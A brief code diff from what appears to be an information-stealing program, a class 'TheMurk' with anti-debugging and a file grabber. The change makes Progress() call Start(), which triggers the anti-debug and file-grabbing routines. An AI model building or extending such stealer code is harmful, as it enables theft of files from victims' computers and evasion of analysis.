@@ -20,12 +20,12 @@ class TheMurk:
         self.msgVPN = []
     
     def Progress(self):
-        pass
+        self.Start()
 
     def Start(self):
         if not config.debuging:
             AntiDebug(config.oneStart)
-        Folders(config.enableFileGrabber,config.oneStart)
+        Folders(config.enableFileGrabber)
     
     def GrabFiles(self):
         if config.enableFileGrabber:
